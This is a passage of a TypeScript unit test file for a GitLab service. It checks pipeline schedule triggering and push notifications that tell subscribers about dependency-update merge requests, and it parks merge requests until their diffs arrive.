    expect(result.pipelineId).toBe(0);
    expect(result.status).toBe('scheduled');
    expect(pipelineTriggerRepository.insert).toHaveBeenCalledWith(
      expect.objectContaining({
        commitSha: null,
        pipelineId: null,
      }),
    );
  });

  it('unwraps gitbeaker response envelope (data property)', async () => {
    const { service, pipelineTriggerRepository } = createService();
    const schedulesPlay = vi.fn().mockResolvedValue({
      data: { last_pipeline: { id: 7777, sha: 'inner123', ref: 'main', status: 'created' } },
    });
    (service as unknown as { api: unknown }).api = {
      PipelineSchedules: { play: schedulesPlay },
    };

    const result = await service.runSchedule(30, ACTOR);

    expect(result.pipelineId).toBe(7777);
    expect(pipelineTriggerRepository.insert).toHaveBeenCalledWith(
      expect.objectContaining({ commitSha: 'inner123', pipelineId: 7777 }),
    );
  });
});

function mrFixture(iid: number, overrides: Partial<MergeRequestWithDiffs> = {}): MergeRequestWithDiffs {
  return {
    id: iid,
    iid,
    title: `chore(update): pkg${iid}`,
    labels: [],
    diffs: [{ diff: '+code' } as never],
    scanFindings: [],
    ...overrides,
  } as unknown as MergeRequestWithDiffs;
}

type NotifyAccess = {
  notifySubscribers(mrs: MergeRequestWithDiffs[]): Promise<void>;
  flushDeferredNotifications(): Promise<void>;
  pendingNotificationIids: Set<number>;
};

function notificationAccess(service: GitlabService): NotifyAccess {
  return service as unknown as NotifyAccess;
}

describe('GitlabService.new-MR push notifications', () => {
  it('notifies subscribers with per-package finding counts and a resumable URL', async () => {
    const { service } = createService(undefined, undefined, undefined, [
      { endpoint: 'https://fcm.test/a' },
      { endpoint: 'https://fcm.test/b' },
    ]);
    vi.mocked(sendNotification).mockResolvedValue({ statusCode: 200, body: '', headers: {} });
    const mrs = [mrFixture(1, { scanFindings: [{ ruleId: 'a' }, { ruleId: 'b' }] as never }), mrFixture(2)];

    await notificationAccess(service).notifySubscribers(mrs);

    expect(sendNotification).toHaveBeenCalledTimes(2);
    const payload = JSON.parse(vi.mocked(sendNotification).mock.calls[0][1] as string) as {
      notification: { body: string; data: { onActionClick: { default: { operation: string; url: string } } } };
    };
    expect(payload.notification.body).toBe('Updates awaiting your review: pkg1 (2 findings), pkg2 (0 findings)');
    expect(payload.notification.data.onActionClick.default.operation).toBe('navigateLastFocusedOrOpen');
    expect(payload.notification.data.onActionClick.default.url).toContain('/update-review?newMr=1,2');
  });

  it('parks MRs whose diffs are unavailable instead of notifying', async () => {
    const { service } = createService(undefined, undefined, undefined, [{ endpoint: 'https://fcm.test/a' }]);
    vi.mocked(sendNotification).mockResolvedValue({ statusCode: 200, body: '', headers: {} });
    const access = notificationAccess(service);

    await access.notifySubscribers([mrFixture(7, { diffs: [] as never })]);

    expect(sendNotification).not.toHaveBeenCalled();
    expect(access.pendingNotificationIids.has(7)).toBe(true);
  });

  it('flushes parked MRs once their diffs become available and clears the park', async () => {
    const { service, cacheGet } = createService(undefined, undefined, undefined, [{ endpoint: 'https://fcm.test/a' }]);
    vi.mocked(sendNotification).mockResolvedValue({ statusCode: 200, body: '', headers: {} });
    const access = notificationAccess(service);
    await access.notifySubscribers([mrFixture(7, { diffs: [] as never })]);
    vi.mocked(cacheGet).mockResolvedValue([mrFixture(7)]);

    await access.flushDeferredNotifications();

    expect(sendNotification).toHaveBeenCalledTimes(1);
    expect(JSON.parse(vi.mocked(sendNotification).mock.calls[0][1] as string)).toMatchObject({
      notification: { body: 'Updates awaiting your review: pkg7 (0 findings)' },
    });
    expect(access.pendingNotificationIids.size).toBe(0);
  });

  it('flush keeps parking while the diffs remain unavailable', async () => {
    const { service, cacheGet } = createService(undefined, undefined, undefined, [{ endpoint: 'https://fcm.test/a' }]);
    vi.mocked(sendNotification).mockResolvedValue({ statusCode: 200, body: '', headers: {} });
    const access = notificationAccess(service);
    await access.notifySubscribers([mrFixture(7, { diffs: [] as never }), mrFixture(9, { diffs: [] as never })]);
    vi.mocked(cacheGet).mockResolvedValue([mrFixture(7, { diffs: [] as never }), mrFixture(9, { diffs: [] as never })]);

    await access.flushDeferredNotifications();

    expect(sendNotification).not.toHaveBeenCalled();
    expect([...access.pendingNotificationIids]).toEqual([7, 9]);
  });

  it('flush notifies only the parked MRs whose diffs arrived, keeping the rest parked', async () => {
    const { service, cacheGet } = createService(undefined, undefined, undefined, [{ endpoint: 'https://fcm.test/a' }]);
    vi.mocked(sendNotification).mockResolvedValue({ statusCode: 200, body: '', headers: {} });
    const access = notificationAccess(service);
    await access.notifySubscribers([mrFixture(7, { diffs: [] as never }), mrFixture(9, { diffs: [] as never })]);
    vi.mocked(cacheGet).mockResolvedValue([mrFixture(7, { diffs: [] as never }), mrFixture(9)]);

    await access.flushDeferredNotifications();

    expect(sendNotification).toHaveBeenCalledTimes(1);
    expect(JSON.parse(vi.mocked(sendNotification).mock.calls[0][1] as string)).toMatchObject({
      notification: { body: 'Updates awaiting your review: pkg9 (0 findings)' },
    });
    expect([...access.pendingNotificationIids]).toEqual([7]);
  });

  it('flush drops parked MRs that are no longer open', async () => {
    const { service, cacheGet } = createService(undefined, undefined, undefined, [{ endpoint: 'https://fcm.test/a' }]);
    vi.mocked(sendNotification).mockResolvedValue({ statusCode: 200, body: '', headers: {} });
    const access = notificationAccess(service);
    await access.notifySubscribers([mrFixture(7, { diffs: [] as never })]);
    vi.mocked(cacheGet).mockResolvedValue([]);

    await access.flushDeferredNotifications();

    expect(sendNotification).not.toHaveBeenCalled();
    expect(access.pendingNotificationIids.size).toBe(0);
  });
});
